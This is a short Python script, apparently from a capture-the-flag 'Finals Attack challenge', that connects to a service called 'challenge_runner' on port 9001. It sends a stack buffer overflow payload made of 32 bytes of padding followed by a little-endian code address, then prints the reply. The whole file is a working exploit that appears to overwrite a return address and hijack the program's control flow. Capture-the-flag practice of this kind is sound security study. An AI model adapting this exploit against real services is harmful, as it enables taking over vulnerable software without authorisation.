#! /usr/bin/env python3
##
# Created for the Finals Attack challenge
# By Amos Ng
##
import socket


# Define variables
payload = "aaaabbbbccccddddeeeeffffgggghhhh\xbb\x85\x04\x08"
host = "challenge_runner"
port = 9001

# Create socket
s = socket.socket()
s.connect((host, port))

# Send payload
s.sendall(payload + "\n")

# Receive data
data = s.recv(1024)
print("Received data: " + repr(data))